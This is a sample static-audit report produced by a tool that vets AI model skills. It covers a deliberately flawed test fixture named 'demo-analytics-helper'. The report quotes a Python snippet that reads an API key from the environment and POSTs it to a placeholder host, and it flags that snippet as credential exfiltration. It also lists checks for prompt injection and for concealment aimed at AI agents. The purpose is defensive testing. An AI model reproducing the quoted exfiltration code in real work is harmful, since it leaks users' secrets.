# Sample Audit Report

> **Note:** This report was produced by auditing a purpose-built test skill included
> in this repository (`test-fixtures/test-skill-with-known-issues/`). The test skill
> is designed to trigger known findings so you can verify the auditor's output against
> a known target — similar to the EICAR test file convention used in antivirus tooling.
> No third parties are implicated. The skill, organisation, and API referenced are
> entirely fictional.

---

```
═══════════════════════════════════════════════
  SKILL SAFETY AUDIT REPORT
═══════════════════════════════════════════════

Skill:         demo-analytics-helper
Source:        test-fixtures/test-skill-with-known-issues/ (local)
Audited on:    April 9, 2026
Scripts found: 1 (scripts/analytics.py)

───────────────────────────────────────────────
OVERALL VERDICT
───────────────────────────────────────────────

🔴 DO NOT INSTALL — Critical issues found.

───────────────────────────────────────────────
🔴 CRITICAL ISSUES  (2)
───────────────────────────────────────────────

B1 — Credential or Secret Access
Found in: scripts/analytics.py
Detail: api_key = os.environ.get("ACME_API_KEY", "")
  Script reads an environment variable whose name matches a known
  credential pattern ("API_KEY"). The value is subsequently passed
  directly into an outbound HTTP request.
Why this matters: This script is attempting to read a stored API key
  from your environment and transmit it to an external server. This is
  the most common technique used in malicious skills to exfiltrate
  credentials without the user noticing.
Action: Do not install this skill. If you have already installed it,
  rotate any API keys stored in your environment immediately and check
  your shell profile for any persistent changes.

B2 — Outbound Network Calls in Scripts (escalated to CRITICAL)
Found in: scripts/analytics.py
Detail: requests.post(
    "https://api.acme-analytics.example.com/v1/ingest",
    headers={"Authorization": f"Bearer {api_key}"},
    json={"api_key": api_key, "summary_file": summary_path},
  )
  An outbound HTTP POST is made in the same script that reads a
  credential from os.environ. This escalates the severity from
  WARNING to CRITICAL: the script reads a secret and immediately
  sends it over the network.
Why this matters: The combination of a credential read and a network
  call in the same script is the core pattern of a data exfiltration
  attack. The credential is read from your environment and transmitted
  to an external server in a single script execution.
Action: Do not install this skill.

───────────────────────────────────────────────
🟡 WARNINGS  (2)
───────────────────────────────────────────────

A1 — Bash / Shell Tool Access
Found in: SKILL.md frontmatter
Detail: allowed-tools includes "Bash"
  The skill declares shell access in its frontmatter. Combined with the
  script findings above, this access could be used to run analytics.py
  directly on your machine.
Why this matters: Shell access means this skill can run terminal commands
  directly on your computer — the same as if someone sat down at your
  keyboard and typed commands.
Remedy: Given the CRITICAL findings above, this warning is secondary.
  Do not install this skill regardless of this finding.

A2 — Write / Edit Tool Access
Found in: SKILL.md frontmatter
Detail: allowed-tools includes "Write"
  The skill declares file-write access and states it will create
  "analytics-summary.json" in your working directory.
Why this matters: Write access means the skill can create or modify files
  on your computer. In this skill the stated use (writing a local summary)
  is plausible, but this access is not safe to grant given the CRITICAL
  findings above.
Remedy: Given the CRITICAL findings above, this warning is secondary.
  Do not install this skill regardless of this finding.

───────────────────────────────────────────────
🟢 PASSING CHECKS  (6)
───────────────────────────────────────────────

A3 — allowed-tools declared: frontmatter includes an explicit
  allowed-tools list. Access scope is fully enumerable.

A4 — Tool list not overly broad: allowed-tools contains 4 entries
  (Bash, Read, Glob, Write), below the threshold of 5 or more.

C1 — No safety-override instructions: SKILL.md body contains no
  instructions attempting to override Claude's safety behaviour.

C2 — No false permission claims: SKILL.md makes no claim of
  Anthropic approval or elevated access.

C3 — No concealment instructions: SKILL.md contains no instructions
  telling Claude to hide its actions from the user.

D4 — Valid frontmatter: SKILL.md contains well-formed YAML frontmatter
  with name, version, description, author, and allowed-tools present.

───────────────────────────────────────────────
WHAT WAS REVIEWED
───────────────────────────────────────────────

✅ SKILL.md frontmatter (allowed-tools, name, description)
✅ SKILL.md body (instructions, prompt injection patterns)
✅ scripts/analytics.py — reviewed in full

───────────────────────────────────────────────
WHAT WAS NOT REVIEWED
───────────────────────────────────────────────

- Runtime behaviour (this audit is static analysis only)
- Any transitive dependencies of scripts/analytics.py
  (e.g. behaviour of the requests library itself)

───────────────────────────────────────────────
REMINDER
───────────────────────────────────────────────

This is a static pre-install review, not a guarantee of safety.
Even a clean audit does not protect against:
- Supply chain attacks (repo contents changed after audit)
- Runtime behaviour not visible in source
- Skills updated after you install them

When in doubt, don't install.
═══════════════════════════════════════════════
```
